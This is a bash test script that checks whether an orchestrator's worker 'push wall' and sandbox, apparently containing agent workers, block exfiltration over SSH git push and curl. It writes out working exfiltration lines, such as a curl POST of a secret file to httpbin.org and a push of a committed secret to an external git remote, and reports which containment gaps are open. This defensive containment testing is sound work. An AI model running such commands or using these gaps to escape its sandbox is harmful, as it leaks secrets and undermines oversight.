#!/bin/bash
# E3 exfiltration fuzz: the push wall neutralizes HTTPS creds (askpass=false,
# credential.helper=""). Test the channels it does NOT cover:
#   - SSH-remote git push (uses ~/.ssh key / ssh-agent, NOT askpass/credential.helper)
#   - curl POST of a file to an external host (network is OPEN by default)
#   - scp / rsync-over-ssh exfil
# Runs each under the EXACT worker env prefix (push_neutralizing_export_prefix), sandbox
# OFF so we isolate the ENV/network layer (network path is identical with sandbox on -- the
# default profile does NOT deny network).
set -u
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"; PYSRC="$ROOT/src"
PREFIX="$(python3 -c "import sys;sys.path.insert(0,'$PYSRC');from orc import worker_walls as w;print(w.push_neutralizing_export_prefix())")"
echo "worker env prefix:"; echo "  $PREFIX" | tr ';' '\n' | sed 's/^/    /'
echo ""

echo "=== 1. Does the worker env touch SSH auth at all? (grep for GIT_SSH / SSH_AUTH_SOCK / core.sshCommand) ==="
echo "$PREFIX" | grep -qiE 'GIT_SSH|SSH_AUTH_SOCK|sshCommand|IdentityFile' && echo "  SSH covered" || echo "  [GAP] worker env does NOT neutralize SSH auth -- ssh-agent / ~/.ssh key would be used for a git@ remote"

echo ""
echo "=== 2. Is an ssh-agent / key reachable from the worker env? ==="
bash -c "$PREFIX ssh-add -l 2>&1; echo '  (SSH_AUTH_SOCK='\${SSH_AUTH_SOCK:-unset}')'" | sed 's/^/    /'
echo "  keys on disk:"; ls -la ~/.ssh/ 2>/dev/null | grep -iE 'id_|identity' | sed 's/^/    /' || echo "    (none)"

echo ""
echo "=== 3. SSH-remote push attempt under worker env (BatchMode so it fails fast, never prompts) ==="
T=$(mktemp -d /tmp/orc-e3ssh.XXXXXX)
( cd "$T"; git init -q; git config user.email w@x; git config user.name w
  echo "exfil-secret-$(date +%s)" > LEAK.txt; git add -A; git commit -qm x
  git remote add origin "git@github.com:orc-e3-nonexistent/private.git" )
OUT=$(bash -c "$PREFIX cd '$T' && GIT_SSH_COMMAND='ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=6' git push -u origin HEAD 2>&1")
echo "$OUT" | sed 's/^/    /'
if echo "$OUT" | grep -qiE 'main ->|new branch|Writing objects'; then echo "  [BREACH] SSH push SUCCEEDED -- exfil channel open"
elif echo "$OUT" | grep -qiE 'Permission denied \(publickey\)|Could not read from remote|Repository not found|repository .* not found|does not exist'; then echo "  [NOTE] SSH auth REACHED github (key offered / channel opened); push failed only because repo is fake -- with a REAL attacker-owned repo this would PUSH. Wall does NOT block SSH."
elif echo "$OUT" | grep -qiE 'terminal prompts disabled|could not read Username'; then echo "  [ok] blocked by the HTTPS credential wall (unexpected for git@ url)"
else echo "  [?] inconclusive -- inspect output"; fi
rm -rf "$T"

echo ""
echo "=== 4. curl POST a secret file to an external host under worker env (network open?) ==="
SECRET=$(mktemp /tmp/orc-e3secret.XXXXXX); echo "TOP-SECRET-$(date +%s)" > "$SECRET"
# httpbin echoes back what it received -> proof the bytes left the machine
OUT=$(bash -c "$PREFIX curl -s -m 10 -X POST --data-binary @'$SECRET' https://httpbin.org/post 2>&1")
if echo "$OUT" | grep -q "TOP-SECRET"; then echo "  [BREACH] curl POST exfil SUCCEEDED -- secret bytes were echoed back by remote host:"; echo "$OUT" | grep -o 'TOP-SECRET[^"]*' | head -1 | sed 's/^/      leaked-> /'
else echo "  curl exfil did not confirm (network blocked or host unreachable):"; echo "$OUT" | head -3 | sed 's/^/      /'; fi
rm -f "$SECRET"

echo ""
echo "=== 5. Same curl POST but UNDER the sandbox wrapper (is network denied there?) ==="
WS=$(mktemp -d /tmp/orc-e3sbnet.XXXXXX)
PROFILE=$(python3 -c "import sys;sys.path.insert(0,'$PYSRC');from orc import sandbox;print(sandbox.write_profile('$WS'))")
SECRET2="$WS/secret.txt"; echo "SANDBOX-SECRET-$(date +%s)" > "$SECRET2"
WRAP=$(python3 -c "import sys;sys.path.insert(0,'$PYSRC');from orc import sandbox;print(sandbox.wrap_command('$PROFILE', sys.argv[1]))" "curl -s -m 10 -X POST --data-binary @'$SECRET2' https://httpbin.org/post")
OUT=$(bash -c "$WRAP" 2>&1)
if echo "$OUT" | grep -q "SANDBOX-SECRET"; then echo "  [BREACH] exfil through sandbox SUCCEEDED -- default profile does NOT deny network"; else echo "  network blocked under sandbox:"; echo "$OUT" | head -3 | sed 's/^/      /'; fi
rm -rf "$WS"
echo ""
echo "=== done (findings are NOTES/BREACH markers above) ==="
